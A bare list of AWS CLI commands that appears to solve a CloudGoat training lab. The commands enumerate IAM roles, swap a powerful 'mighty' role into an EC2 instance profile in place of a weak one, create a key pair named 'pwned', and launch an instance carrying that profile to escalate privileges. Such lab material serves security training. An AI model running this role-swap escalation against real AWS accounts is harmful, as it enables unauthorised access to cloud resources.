`aws configure --profile Kerrigan`

`aws ec2 describe-instances --profile Kerrigan`

`aws iam list-instance-profiles --profile Kerrigan`

`aws iam list-roles --profile Kerrigan`

`aws iam remove-role-from-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-<cloudgoat_id> --role-name cg-ec2-meek-role-<cloudgoat_id> --profile Kerrigan`

`aws iam add-role-to-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-<cloudgoat_id> --role-name cg-ec2-mighty-role-<cloudgoat_id> --profile Kerrigan`

`aws ec2 create-key-pair --key-name pwned --profile Kerrigan`

`aws ec2 describe-subnets --profile Kerrigan`

`aws ec2 describe-security-groups --profile Kerrigan`

`aws ec2 run-instances --image-id ami-0a313d6098716f372 --iam-instance-profile Arn=<instanceProfileArn> --key-name pwned --profile kerrigan --subnet-id <subnetId> --security-group-ids <securityGroupId>`

`sudo apt-get update`

`sudo apt-get install awscli`

`aws ec2 describe-instances --region us-east-1`

`aws ec2 terminate-instances --instance-ids <instanceId> --region us-east-1`
